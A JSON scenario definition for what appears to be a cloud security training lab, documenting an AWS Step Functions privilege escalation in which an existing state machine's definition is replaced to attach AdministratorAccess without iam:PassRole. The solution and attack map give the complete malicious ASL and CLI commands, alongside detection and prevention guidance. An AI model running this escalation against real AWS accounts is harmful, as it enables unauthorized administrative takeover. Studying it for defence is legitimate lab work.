@@ -1,0 +1,218 @@
+{
+  "displayName": "UpdateStateMachine + StartExecution on Existing Admin-Role State Machine",
+  "name": "stepfunctions-002-states-updatestatemachine+states-startexecution",
+  "description": "Principal with states:UpdateStateMachine and states:StartExecution can replace an existing state machine's definition with malicious ASL that runs under the machine's pre-existing admin role \u2014 no iam:PassRole required",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "stepfunctions-002",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "existing-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation"
+    ],
+    "techniques": [
+      "T1098 - Account Manipulation",
+      "T1578 - Modify Cloud Compute Infrastructure"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_stepfunctions_002_states_updatestatemachine_states_startexecution",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/stepfunctions-002-states-updatestatemachine+states-startexecution"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/stepfunctions-002-states-updatestatemachine+states-startexecution",
+  "schemaVersion": "4.7.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-stepfunctions-002-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "states:UpdateStateMachine",
+            "resource": "arn:aws:states:*:*:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine",
+            "description": "replace the state machine's definition with attacker-authored ASL"
+          },
+          {
+            "permission": "states:StartExecution",
+            "resource": "arn:aws:states:*:*:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine",
+            "description": "trigger the malicious execution that runs as the pre-existing admin role"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "states:ListStateMachines",
+            "purpose": "Discover existing state machines in the account"
+          },
+          {
+            "permission": "states:DescribeStateMachine",
+            "purpose": "Inspect the state machine's current definition and role ARN"
+          },
+          {
+            "permission": "states:ListExecutions",
+            "purpose": "Monitor execution status after StartExecution"
+          },
+          {
+            "permission": "states:DescribeExecution",
+            "purpose": "Check whether the execution succeeded and AdministratorAccess was attached"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-stepfunctions-002-to-admin-starting-user` IAM user to the `pl-prod-stepfunctions-002-to-admin-statemachine-role` administrative role by replacing an existing state machine's benign definition with malicious ASL that attaches `AdministratorAccess` to the starting user \u2014 without ever needing `iam:PassRole`.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-stepfunctions-002-to-admin-starting-user`\n- **Destination resource:** `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/stepfunctions-002-to-admin`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable stepfunctions-002-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `stepfunctions-002-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n|-----|---------|\n| `arn:aws:iam::{account_id}:user/pl-prod-stepfunctions-002-to-admin-starting-user` | Starting IAM user with only states:UpdateStateMachine and states:StartExecution |\n| `arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine` | Pre-existing state machine with a benign initial definition and admin execution role attached |\n| `arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-002-to-admin-statemachine-role` | State machine execution role with AdministratorAccess \u2014 the privileged role abused by the attacker |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/stepfunctions-002-to-admin` | CTF flag stored as an SSM String parameter; readable only with admin-equivalent credentials |",
+      "demoAttack": {
+        "executing": "The script will:\n\n1. Retrieve starting user credentials from Terraform outputs\n2. Confirm the starting user is denied access to the SSM flag (proving no prior privilege)\n3. Build a malicious ASL definition: a single `Task` state that calls `arn:aws:states:::aws-sdk:iam:attachUserPolicy` to attach `AdministratorAccess` to the starting user\n4. Call `states:UpdateStateMachine` to replace the state machine's benign definition with the malicious ASL (no `iam:PassRole` required since `roleArn` is unchanged)\n5. Call `states:StartExecution` to trigger the malicious execution, which runs as the pre-existing admin role\n6. Wait 30 seconds for the IAM policy attachment to propagate\n7. Confirm the starting user can now read the SSM flag, proving successful privilege escalation",
+        "resourcesCreated": "- Temporary ASL definition JSON file written to `/tmp/` (cleaned up by the script)\n- `AdministratorAccess` managed policy attached to `pl-prod-stepfunctions-002-to-admin-starting-user`\n- Updated state machine definition on `pl-prod-stepfunctions-002-to-admin-statemachine` (benign definition restored by `cleanup_attack.sh`)",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo stepfunctions-002-states-updatestatemachine+states-startexecution\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup stepfunctions-002-states-updatestatemachine+states-startexecution\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable stepfunctions-002-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `stepfunctions-002-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user `pl-prod-stepfunctions-002-to-admin-starting-user` has `states:UpdateStateMachine` on the state machine `pl-prod-stepfunctions-002-to-admin-statemachine` \u2014 combined with `states:StartExecution`, this constitutes a privilege escalation path without requiring `iam:PassRole`\n- State machine `pl-prod-stepfunctions-002-to-admin-statemachine` has an execution role (`pl-prod-stepfunctions-002-to-admin-statemachine-role`) with `AdministratorAccess` \u2014 any principal with `states:UpdateStateMachine` on this resource can effectively assume admin without `iam:PassRole`\n- The combination of `states:UpdateStateMachine + states:StartExecution` on a state machine whose execution role holds sensitive permissions is a standing privilege escalation risk, equivalent to a PassRole bypass\n- `pl-prod-stepfunctions-002-to-admin-statemachine-role` grants `AdministratorAccess` to `states.amazonaws.com` \u2014 this service principal can perform any IAM action including `iam:AttachUserPolicy` and `iam:CreateRole`",
+        "prevention": "- Apply SCPs or permission boundaries that block `states:UpdateStateMachine` for non-administrative IAM principals \u2014 or restrict it to state machines tagged as non-privileged\n- Enforce tag-based IAM conditions (e.g., `aws:ResourceTag/sensitivity != high`) so that `states:UpdateStateMachine` cannot be exercised on state machines with sensitive execution roles\n- Audit state machine execution roles for `AdministratorAccess` or wildcard IAM policies; grant only the minimum permissions required by the state machine's legitimate workload\n- Use resource-based controls or AWS Config rules to alert when a state machine's execution role holds admin-equivalent policies\n- Require `iam:PassRole` scoping: use an SCP or IAM condition on state machine creation and update operations to enforce that the execution role's permissions are limited to the state machine's intended actions\n- Regularly review CloudTrail for `states:UpdateStateMachine` events and correlate any subsequent `iam:AttachUserPolicy` or `iam:AttachRolePolicy` events with `states.amazonaws.com` as the caller"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `states:UpdateStateMachine` -- state machine definition replaced; high severity when the new definition contains `aws-sdk:iam:*` resource references or other IAM SDK integrations\n- `states:StartExecution` -- state machine execution triggered; correlate with recent `UpdateStateMachine` events on the same resource to detect exploitation attempts\n- `iam:AttachUserPolicy` -- IAM policy attached to a user; critical when `userAgent` contains `states.amazonaws.com` or the `sourceIPAddress` field shows the Step Functions service endpoint \u2014 this indicates the attachment was performed by a state machine execution rather than a human operator\n- `iam:AttachRolePolicy` -- IAM policy attached to a role; same service-principal correlation applies\n- `ssm:GetParameter` -- SSM parameter accessed; alert when the parameter path matches `/pathfinding-labs/flags/*` and the caller is the starting user rather than an expected admin",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [https://pathfinding.cloud/paths/stepfunctions-002](https://pathfinding.cloud/paths/stepfunctions-002) -- Pathfinding.cloud path entry for this technique\n- [https://attack.mitre.org/techniques/T1098/](https://attack.mitre.org/techniques/T1098/) -- MITRE ATT&CK T1098: Account Manipulation\n- [https://attack.mitre.org/techniques/T1578/](https://attack.mitre.org/techniques/T1578/) -- MITRE ATT&CK T1578: Modify Cloud Compute Infrastructure\n- [https://docs.aws.amazon.com/step-functions/latest/apireference/API_UpdateStateMachine.html](https://docs.aws.amazon.com/step-functions/latest/apireference/API_UpdateStateMachine.html) -- AWS API reference for UpdateStateMachine\n- [https://docs.aws.amazon.com/step-functions/latest/dg/concepts-amazon-states-language.html](https://docs.aws.amazon.com/step-functions/latest/dg/concepts-amazon-states-language.html) -- Amazon States Language reference",
+    "solution": "# Solution: UpdateStateMachine + StartExecution on Existing Admin-Role State Machine\n\nAWS Step Functions is primarily thought of as an orchestration service \u2014 a way to coordinate Lambda functions, ECS tasks, and other compute into workflows. What's less obvious is that it can also act as a privilege escalation vector when a principal holds `states:UpdateStateMachine` on a state machine whose execution role carries sensitive permissions.\n\nThe key mechanic is subtle: AWS only requires `iam:PassRole` when you *change* a state machine's execution role. If you leave `roleArn` unchanged and only update the `definition`, no PassRole check happens at all. Combined with Step Functions' native AWS SDK integration \u2014 which lets state machine task states call almost any AWS API using the execution role \u2014 this means a principal with just two permissions (`states:UpdateStateMachine` and `states:StartExecution`) can effectively invoke any IAM action that the execution role permits, including attaching `AdministratorAccess` to themselves.\n\nThis pattern is the existing-resource twin of `stepfunctions-001` (which requires creating a new state machine and explicitly passing a privileged role). Here, the privileged role is already attached \u2014 making this an \"existing-passrole\" escalation that looks deceptively low-risk from a permission-surface perspective.\n\n## The Challenge\n\nYou have obtained credentials for `pl-prod-stepfunctions-002-to-admin-starting-user` \u2014 a low-privilege IAM user with a narrow policy granting only `states:UpdateStateMachine` and `states:StartExecution` on a specific state machine, plus a handful of read-only Step Functions permissions for reconnaissance. The user has no IAM write permissions and no `iam:PassRole`.\n\nYour goal is to reach `AdministratorAccess` and read the CTF flag from SSM Parameter Store. Somewhere in the account is a Step Functions state machine with an admin execution role already attached. The path runs through that machine's definition.\n\nSet your credentials and confirm your starting identity:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<starting_user_access_key_id>\nexport AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>\nunset AWS_SESSION_TOKEN\n\naws sts get-caller-identity\n```\n\nYou should see yourself as `pl-prod-stepfunctions-002-to-admin-starting-user`. Now confirm you can't yet touch anything sensitive:\n\n```bash\naws ssm get-parameter --name /pathfinding-labs/flags/stepfunctions-002-to-admin\n# AccessDeniedException: User is not authorized to perform: ssm:GetParameter\n```\n\nGood. No admin access yet.\n\n## Reconnaissance\n\nStart by discovering what state machines exist in the account:\n\n```bash\naws stepfunctions list-state-machines --query 'stateMachines[*].[name,stateMachineArn]' --output table\n```\n\nYou'll see `pl-prod-stepfunctions-002-to-admin-statemachine` listed. Inspect it to understand its current definition and \u2014 critically \u2014 its execution role:\n\n```bash\naws stepfunctions describe-state-machine \\\n  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine\n```\n\nThe output shows a benign initial definition (a Pass state that does nothing), but more importantly, it shows the `roleArn` field: `arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-002-to-admin-statemachine-role`. That role is what makes this exploitable. If you have access to IAM enumeration tools, you can confirm it holds `AdministratorAccess`:\n\n```bash\naws iam list-attached-role-policies \\\n  --role-name pl-prod-stepfunctions-002-to-admin-statemachine-role\n```\n\nThe key insight lands here: this state machine has an admin role. And you can replace its definition without touching its role.\n\n## Exploitation\n\nThe attack has two steps: rewrite the definition, then pull the trigger.\n\nFirst, craft a malicious ASL definition. Step Functions' AWS SDK integration lets any Task state call an AWS API directly using the execution role, without any Lambda or compute in between. The syntax is `arn:aws:states:::aws-sdk:{service}:{action}`. You want to call `iam:AttachUserPolicy` \u2014 in ASL that's the `iam:attachUserPolicy` action:\n\n```bash\ncat > /tmp/malicious-def.json <<'EOF'\n{\n  \"Comment\": \"Escalation payload\",\n  \"StartAt\": \"AttachAdmin\",\n  \"States\": {\n    \"AttachAdmin\": {\n      \"Type\": \"Task\",\n      \"Resource\": \"arn:aws:states:::aws-sdk:iam:attachUserPolicy\",\n      \"Parameters\": {\n        \"UserName\": \"pl-prod-stepfunctions-002-to-admin-starting-user\",\n        \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n      },\n      \"End\": true\n    }\n  }\n}\nEOF\n```\n\nNow update the state machine's definition. Notice that the command only specifies `--definition` \u2014 not `--role-arn`. By omitting `roleArn`, AWS does not perform a `PassRole` check:\n\n```bash\naws stepfunctions update-state-machine \\\n  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine \\\n  --definition file:///tmp/malicious-def.json\n```\n\nA successful response includes an `updateDate` timestamp. The definition is now live.\n\nWait a few seconds for the update to take effect, then start an execution:\n\n```bash\naws stepfunctions start-execution \\\n  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine\n```\n\nThe execution begins immediately. Step Functions assumes `pl-prod-stepfunctions-002-to-admin-statemachine-role` (which holds `AdministratorAccess`) and runs the `AttachAdmin` task, calling `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. The execution typically completes in under 10 seconds.\n\nYou can monitor it if you want:\n\n```bash\nEXEC_ARN=$(aws stepfunctions start-execution \\\n  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine \\\n  --query 'executionArn' --output text)\n\naws stepfunctions describe-execution --execution-arn \"$EXEC_ARN\" \\\n  --query '[status,stopDate]' --output text\n```\n\nWait for `SUCCEEDED` in the status field, then allow ~30 seconds for IAM policy attachment to propagate across the AWS control plane.\n\n## Verification\n\nStill using your original starting user credentials, confirm the policy is now attached:\n\n```bash\naws iam list-attached-user-policies \\\n  --user-name pl-prod-stepfunctions-002-to-admin-starting-user\n```\n\nYou should see `AdministratorAccess` in the list. Now test it:\n\n```bash\naws iam list-users --max-items 3 --output table\n```\n\nIt works. Your starting user credentials now carry full administrator permissions \u2014 no credential rotation, no new keys, no role assumption required.\n\n## Capture the Flag\n\nThe same starting user credentials that were denied at the beginning now have `AdministratorAccess`, which includes `ssm:GetParameter` on all parameters in the account. Read the CTF flag directly:\n\n```bash\naws ssm get-parameter \\\n  --name /pathfinding-labs/flags/stepfunctions-002-to-admin \\\n  --query 'Parameter.Value' \\\n  --output text\n```\n\nThis returns the flag value for your deployment. The parameter is a `String` type and is returned in plaintext directly.\n\n## What Happened\n\nYou exploited a two-permission privilege escalation path that bypasses the `iam:PassRole` check that normally gates Step Functions attacks. The critical precondition was an existing state machine with an admin execution role \u2014 a configuration that appears legitimately in many accounts where state machines orchestrate infrastructure automation, security workflows, or compliance checks.\n\nBy calling `states:UpdateStateMachine` without changing `roleArn`, you injected a malicious ASL definition that used Step Functions' native AWS SDK integration to call `iam:AttachUserPolicy` on your behalf. The execution role did the IAM work; your principal only needed to write the definition and start the execution.\n\nIn real environments this pattern is dangerous precisely because `states:UpdateStateMachine` looks like a developer convenience permission rather than a privilege escalation vector. Teams routinely grant it to CI/CD pipelines and automation accounts for deploying workflow updates. If any of those state machines carry admin execution roles for their legitimate workload, every principal with `UpdateStateMachine` access becomes a potential admin \u2014 no PassRole alarm fires, and the IAM event that triggers (`iam:AttachUserPolicy` with `states.amazonaws.com` as the caller) is easy to miss if your SIEM isn't specifically correlating service-principal IAM mutations with recent definition updates.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-stepfunctions-002-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has two Step Functions permissions: states:UpdateStateMachine and states:StartExecution on the pre-existing state machine in this account. It also holds helpful recon permissions \u2014 states:ListStateMachines, states:DescribeStateMachine, states:ListExecutions, and states:DescribeExecution \u2014 but notably lacks iam:PassRole.\n"
+      },
+      {
+        "id": "state-machine",
+        "label": "Admin-Role State Machine",
+        "type": "resource",
+        "subType": "sfn-state-machine",
+        "arn": "arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine",
+        "description": "A pre-existing Step Functions Standard state machine with a benign initial definition (a single Pass state). The critical detail is its execution role: pl-prod-stepfunctions-002-to-admin-statemachine-role holds AdministratorAccess. Any principal with states:UpdateStateMachine on this resource can replace the definition with attacker-authored ASL and then trigger execution \u2014 effectively running arbitrary IAM actions as an administrator without ever holding iam:PassRole themselves.\n"
+      },
+      {
+        "id": "statemachine-role",
+        "label": "State Machine Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-002-to-admin-statemachine-role",
+        "description": "The execution role for pl-prod-stepfunctions-002-to-admin-statemachine. It has AdministratorAccess attached and trusts states.amazonaws.com. When the malicious state machine definition runs, it uses this role to call iam:AttachUserPolicy \u2014 attaching AdministratorAccess to the starting user. After this execution completes, the starting user's existing credentials now carry full administrator permissions.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/stepfunctions-002-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM String parameter. Retrieving it requires ssm:GetParameter on this specific parameter, which is only available to principals with AdministratorAccess or an explicit allow. The starting user is denied access before escalation; after the state machine execution attaches AdministratorAccess, the same starting user credentials can read this parameter directly.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "state-machine",
+        "label": "states:UpdateStateMachine",
+        "description": "The starting user replaces the state machine's benign definition with malicious ASL. The new definition contains a single Task state using the AWS SDK integration (arn:aws:states:::aws-sdk:iam:attachUserPolicy) to attach the AdministratorAccess managed policy to the starting user. Because the roleArn is not changed in this UpdateStateMachine call, AWS does not require iam:PassRole \u2014 the attacker never needs the PassRole permission that would normally gate this kind of privilege transfer.\n",
+        "commands": [
+          {
+            "description": "Build the malicious ASL definition targeting the starting user",
+            "command": "cat > /tmp/malicious-def.json <<'EOF'\n{\n  \"Comment\": \"Escalation payload\",\n  \"StartAt\": \"AttachAdmin\",\n  \"States\": {\n    \"AttachAdmin\": {\n      \"Type\": \"Task\",\n      \"Resource\": \"arn:aws:states:::aws-sdk:iam:attachUserPolicy\",\n      \"Parameters\": {\n        \"UserName\": \"pl-prod-stepfunctions-002-to-admin-starting-user\",\n        \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n      },\n      \"End\": true\n    }\n  }\n}\nEOF\n"
+          },
+          {
+            "description": "Replace the state machine definition (no iam:PassRole required)",
+            "command": "aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine --definition file:///tmp/malicious-def.json"
+          }
+        ],
+        "hints": [
+          "The key insight here is that states:UpdateStateMachine only requires iam:PassRole when you also change the roleArn. If you leave the roleArn untouched, you can swap the definition freely \u2014 and the execution will still run under the existing admin role.",
+          "Build an ASL definition with a single Task state that uses the AWS SDK integration syntax: resource arn:aws:states:::aws-sdk:iam:attachUserPolicy with Parameters containing your UserName and the AdministratorAccess policy ARN. Then call UpdateStateMachine with --definition file://... pointing at your ASL JSON.",
+          "Browse to https://pathfinding.cloud/paths/stepfunctions-002 for technique details."
+        ]
+      },
+      {
+        "from": "state-machine",
+        "to": "statemachine-role",
+        "label": "states:StartExecution",
+        "description": "The starting user calls states:StartExecution to trigger the malicious definition. Step Functions assumes the pre-existing execution role (pl-prod-stepfunctions-002-to-admin-statemachine-role, which holds AdministratorAccess) and runs the AttachAdmin task. The IAM SDK integration calls iam:AttachUserPolicy on behalf of the execution role, attaching AdministratorAccess to the starting user. After the execution completes and IAM propagates (~30 seconds), the starting user's existing credentials now carry full admin permissions.\n",
+        "commands": [
+          {
+            "description": "Start an execution of the malicious state machine",
+            "command": "aws stepfunctions start-execution --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine"
+          },
+          {
+            "description": "Wait for execution to complete and IAM to propagate",
+            "command": "sleep 30"
+          },
+          {
+            "description": "Confirm the starting user now has AdministratorAccess",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-stepfunctions-002-to-admin-starting-user"
+          }
+        ],
+        "hints": []
+      },
+      {
+        "from": "statemachine-role",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "The state machine execution attached AdministratorAccess to the starting user. Using the same starting user credentials (no new keys needed), read the CTF flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, including this scenario's flag.\n",
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag using the now-elevated starting user credentials",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/stepfunctions-002-to-admin --query 'Parameter.Value' --output text"
+          }
+        ],
+        "hints": [
+          "You now hold admin-equivalent credentials via the same starting user keys. The flag is stored in AWS Systems Manager Parameter Store under the standard pathfinding-labs flags prefix.",
+          "Use ssm:GetParameter with the scenario-specific path to retrieve the flag value."
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "states"
+  ],
+  "slug": "stepfunctions-002",
+  "hasDemoTranscript": false
+}
